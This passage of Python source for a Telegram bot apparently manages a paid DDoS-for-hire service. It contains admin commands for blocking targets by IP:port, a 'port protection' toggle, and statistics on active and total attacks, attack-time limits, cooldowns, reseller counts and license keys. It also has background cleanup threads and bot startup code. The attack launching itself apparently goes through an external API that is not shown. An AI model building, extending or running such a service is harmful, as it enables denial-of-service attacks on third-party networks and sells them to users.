        
        blocked = settings_col.find_one({"_id": "blocked_ports"}) or {}
        if key in blocked:
            bot.reply_to(message, f"⚠️ {key} is already blocked.")
            return
        
        settings_col.update_one(
            {"_id": "blocked_ports"},
            {"$set": {key: datetime.now().strftime('%d-%m-%Y %H:%M:%S')}},
            upsert=True
        )
        
        log_admin_action(message.from_user.id, "block_port", f"Blocked {key}")
        
        bot.reply_to(message, 
                    f"✅ <b>Port Blocked</b>\n\n"
                    f"🎯 Target: {target}:{port}\n"
                    f"⏱ Duration: {PORT_BLOCK_DURATION // 3600} hours\n"
                    f"🕒 Blocked at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                    f"🚫 This target is now blocked for {PORT_BLOCK_DURATION // 3600} hours.")
        
    except Exception as e:
        logger.error(f"Error in block_port command: {e}")
        log_error(e, user_id=message.from_user.id, command="block_port")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= BLOCKED PORTS LIST COMMAND =================
@bot.message_handler(commands=['blocked_ports'])
def blocked_ports_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can view this.")
            return
        
        blocked = settings_col.find_one({"_id": "blocked_ports"}) or {}
        if "_id" in blocked:
            del blocked["_id"]
        
        if not blocked:
            bot.reply_to(message, "📋 No ports are currently blocked.")
            return
        
        text = "🚫 <b>Blocked Ports</b>\n\n"
        now = datetime.now()
        
        for key, block_time_str in blocked.items():
            try:
                block_time = datetime.strptime(block_time_str, '%d-%m-%Y %H:%M:%S')
                remaining = PORT_BLOCK_DURATION - (now - block_time).total_seconds()
                
                if remaining > 0:
                    mins = int(remaining // 60)
                    secs = int(remaining % 60)
                    text += f"├ 🎯 {key} - {mins}m {secs}s remaining\n"
                else:
                    text += f"├ 🎯 {key} - ⚠️ Expired (will be auto-removed)\n"
            except:
                text += f"├ 🎯 {key} - Unknown format\n"
        
        text += f"\n⏱ Block duration: {PORT_BLOCK_DURATION // 3600} hours"
        
        bot.reply_to(message, text)
        
    except Exception as e:
        logger.error(f"Error in blocked_ports command: {e}")
        log_error(e, user_id=message.from_user.id, command="blocked_ports")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= PORT PROTECTION COMMAND =================
@bot.message_handler(commands=['port_protection'])
def port_protection_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can use this command.")
            return
        
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "⚠️ Usage: /port_protection on/off")
            return
        
        status = parts[1].lower()
        current_status = get_setting("port_protection", False)
        
        if status == "on":
            update_setting("port_protection", True)
            bot.reply_to(message, "🛡️ <b>Port Protection Enabled</b>\n\n"
                        "Users cannot attack the same IP:Port for 2 hours.\n"
                        "This prevents repeated attacks on the same target.")
            log_admin_action(message.from_user.id, "port_protection", "Enabled")
        elif status == "off":
            update_setting("port_protection", False)
            bot.reply_to(message, "❌ <b>Port Protection Disabled</b>\n\n"
                        "Users can now attack the same IP:Port without restrictions.")
            log_admin_action(message.from_user.id, "port_protection", "Disabled")
        else:
            bot.reply_to(message, "⚠️ Please specify 'on' or 'off'.")
            
    except Exception as e:
        logger.error(f"Error in port_protection command: {e}")
        log_error(e, user_id=message.from_user.id, command="port_protection")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= STATE COMMAND =================
@bot.message_handler(commands=['state'])
def state_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can view this.")
            return
        
        active_attacks = get_active_attack_count()
        max_conc = get_setting("max_concurrent_attacks", DEFAULT_MAX_CONCURRENT)
        total_users = plans_col.count_documents({})
        active_users = plans_col.count_documents({"expires": {"$gt": datetime.now().isoformat()}})
        total_groups = groups_col.count_documents({})
        total_resellers = resellers_col.count_documents({})
        total_admins = admins_col.count_documents({})
        total_banned = bans_col.count_documents({})
        total_keys = keys_col.count_documents({})
        redeemed_keys = keys_col.count_documents({"redeemed_by": {"$ne": None}})
        active_keys = keys_col.count_documents({"redeemed_by": None, "expires": {"$gt": datetime.now().isoformat()}})
        
        pending_feedback = get_pending_feedback_count()
        total_feedback = feedback_submissions_col.count_documents({})
        reviewed_feedback = feedback_submissions_col.count_documents({"reviewed": True})
        
        stats = bot_stats_col.find_one({"_id": "stats"})
        total_attacks = stats.get("total_attacks_handled", 0) if stats else 0
        total_users_served = stats.get("total_users_served", 0) if stats else 0
        
        start_time_str = get_setting("bot_start_time")
        if start_time_str:
            uptime_seconds = (datetime.now() - datetime.fromisoformat(start_time_str)).total_seconds()
            uptime_str = format_duration(int(uptime_seconds))
        else:
            uptime_str = "Unknown"
        
        maint = get_setting("maintenance_mode", False)
        port_prot = get_setting("port_protection", False)
        feedback = get_setting("feedback_system", True)
        
        state_text = (
            f"📊 <b>BOT STATISTICS</b>\n"
            f"╔══════════════════════════════╗\n"
            f"║   📊 FULL STATISTICS        ║\n"
            f"╚══════════════════════════════╝\n\n"
            f"━━━━━━━ <b>ATTACKS</b> ━━━━━━━\n"
            f"🔥 Active Attacks: {active_attacks}/{max_conc}\n"
            f"📈 Total Attacks: {total_attacks}\n"
            f"👤 Users Served: {total_users_served}\n\n"
            f"━━━━━━━ <b>USERS</b> ━━━━━━━\n"
            f"👤 Total Users: {total_users}\n"
            f"✅ Active Users: {active_users}\n"
            f"🚫 Banned Users: {total_banned}\n\n"
            f"━━━━━━━ <b>GROUPS</b> ━━━━━━━\n"
            f"👥 Approved Groups: {total_groups}\n\n"
            f"━━━━━━━ <b>KEYS</b> ━━━━━━━\n"
            f"🔑 Total Keys: {total_keys}\n"
            f"✅ Active Keys: {active_keys}\n"
            f"✅ Redeemed Keys: {redeemed_keys}\n\n"
            f"━━━━━━━ <b>STAFF</b> ━━━━━━━\n"
            f"👑 Owner: 1\n"
            f"👮 Admins: {total_admins}\n"
            f"💰 Resellers: {total_resellers}\n\n"
            f"━━━━━━━ <b>FEEDBACK</b> ━━━━━━━\n"
            f"📸 Total Submissions: {total_feedback}\n"
            f"⏳ Pending Review: {pending_feedback}\n"
            f"✅ Reviewed: {reviewed_feedback}\n\n"
            f"━━━━━━━ <b>SETTINGS</b> ━━━━━━━\n"
            f"⏱ Max Attack Time: {get_setting('max_attack_time')}s\n"
            f"⏳ Cooldown: {get_setting('cooldown')}s\n"
            f"🛡 Port Protection: {'✅ ON' if port_prot else '❌ OFF'}\n"
            f"📸 Feedback System: {'✅ ON' if feedback else '❌ OFF'}\n"
            f"🛠 Maintenance: {'✅ ON' if maint else '❌ OFF'}\n\n"
            f"━━━━━━━ <b>SYSTEM</b> ━━━━━━━\n"
            f"🔄 Uptime: {uptime_str}\n"
            f"📅 Last Reset: {get_setting('last_reset_time', 'Never')}\n"
            f"📦 API: {get_setting('api_url', DEFAULT_API_URL)[:50]}..."
        )
        
        bot.reply_to(message, state_text)
        
    except Exception as e:
        logger.error(f"Error in state command: {e}")
        log_error(e, user_id=message.from_user.id, command="state")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= AUTO RESET FUNCTION =================
def auto_reset_bot():
    while True:
        try:
            time.sleep(AUTO_RESET_INTERVAL)
            
            if not get_setting("auto_reset_enabled", True):
                continue
            
            logger.info("Running auto-reset...")
            
            with _attack_lock:
                now = datetime.now()
                expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
                for k in expired:
                    del active_attacks[k]
            
            expired_plans = plans_col.delete_many({"expires": {"$lt": datetime.now().isoformat()}})
            
            expired_keys = keys_col.delete_many({
                "redeemed_by": None, 
                "expires": {"$lt": datetime.now().isoformat()}
            })
            
            seven_days_ago = (datetime.now() - timedelta(days=7)).isoformat()
            attack_logs_col.delete_many({"timestamp": {"$lt": seven_days_ago}})
            
            thirty_days_ago = (datetime.now() - timedelta(days=30)).isoformat()
            feedback_submissions_col.delete_many({
                "submitted_at": {"$lt": thirty_days_ago},
                "reviewed": True
            })
            
            update_setting("last_reset_time", datetime.now().isoformat())
            
            logger.info(f"Auto-reset completed. Removed {expired_plans.deleted_count} expired plans, {expired_keys.deleted_count} expired keys")
            
            try:
                reset_msg = (
                    f"🔄 <b>Auto Reset Completed</b>\n\n"
                    f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                    f"🗑 Expired Plans: {expired_plans.deleted_count}\n"
                    f"🔑 Expired Keys: {expired_keys.deleted_count}\n"
                    f"⚡ Active Attacks: {get_active_attack_count()}\n"
                    f"📸 Pending Feedback: {get_pending_feedback_count()}"
                )
                bot.send_message(BOT_OWNER, reset_msg)
            except:
                pass
            
        except Exception as e:
            logger.error(f"Error in auto reset: {e}")
            log_error(e, extra_info={"function": "auto_reset"})
            time.sleep(60)

reset_thread = threading.Thread(target=auto_reset_bot, daemon=True)
reset_thread.start()

# ================= BACKGROUND TASKS =================
def background_cleanup():
    while True:
        try:
            time.sleep(60)
            
            with _attack_lock:
                now = datetime.now()
                expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
                for k in expired:
                    del active_attacks[k]
            
            with _attack_lock:
                now = datetime.now()
                expired_cd = [k for k, v in user_cooldowns.items() if v <= now]
                for k in expired_cd:
                    del user_cooldowns[k]
            
            week_ago = (datetime.now() - timedelta(days=7)).isoformat()
            pending_feedback_col.delete_many({
                "pending_since": {"$lt": week_ago}
            })
                    
        except Exception as e:
            logger.error(f"Background cleanup error: {e}")
            time.sleep(10)

cleanup_thread = threading.Thread(target=background_cleanup, daemon=True)
cleanup_thread.start()

# ================= ENHANCED ERROR HANDLER FOR BOT =================
def handle_bot_errors():
    while True:
        try:
            logger.info("Starting bot polling...")
            bot.polling(none_stop=True, timeout=60, long_polling_timeout=60)
        except requests.exceptions.ReadTimeout:
            logger.warning("Read timeout occurred. Restarting polling...")
            time.sleep(5)
        except requests.exceptions.ConnectionError:
            logger.warning("Connection error. Retrying in 10 seconds...")
            time.sleep(10)
        except Exception as e:
            logger.error(f"Bot polling error: {e}")
            log_error(e)
            time.sleep(5)

# ================= SIGNAL HANDLERS =================
def signal_handler(sig, frame):
    logger.info("Shutdown signal received. Cleaning up...")
    update_setting("bot_stopped_time", datetime.now().isoformat())
    logger.info("Bot stopped gracefully")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# ================= START BOT =================
if __name__ == "__main__":
    update_setting("bot_start_time", datetime.now().isoformat())
    
    logger.info("=" * 50)
    logger.info("Bot Starting...")
    logger.info(f"Bot Owner: {BOT_OWNER}")
    logger.info(f"API URL: {get_setting('api_url', DEFAULT_API_URL)}")
    logger.info(f"Max Concurrent: {get_setting('max_concurrent_attacks')}")
    logger.info(f"Max Attack Time: {get_setting('max_attack_time')}s")
    logger.info(f"Auto Reset: {'Enabled' if get_setting('auto_reset_enabled') else 'Disabled'}")
    logger.info(f"Auto Reset Interval: {AUTO_RESET_INTERVAL}s")
    logger.info(f"Feedback System: {'Enabled' if get_setting('feedback_system') else 'Disabled'}")
    logger.info("=" * 50)
    
    try:
        startup_msg = (
            f"✅ <b>Bot Started Successfully!</b>\n\n"
            f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"⚙️ Config:\n"
            f"├ Max Concurrent: {get_setting('max_concurrent_attacks')}\n"
            f"├ Max Time: {get_setting('max_attack_time')}s\n"
            f"├ Cooldown: {get_setting('cooldown')}s\n"
            f"├ Auto Reset: {AUTO_RESET_INTERVAL}s\n"
            f"├ Feedback: {'✅ ON' if get_setting('feedback_system') else '❌ OFF'}\n"
            f"└ API: {get_setting('api_url', 'Default')[:50]}...\n\n"
            f"🔄 Bot is ready for operations!"
        )
        bot.send_message(BOT_OWNER, startup_msg)
    except Exception as e:
        logger.error(f"Failed to send startup notification: {e}")
    
    handle_bot_errors()
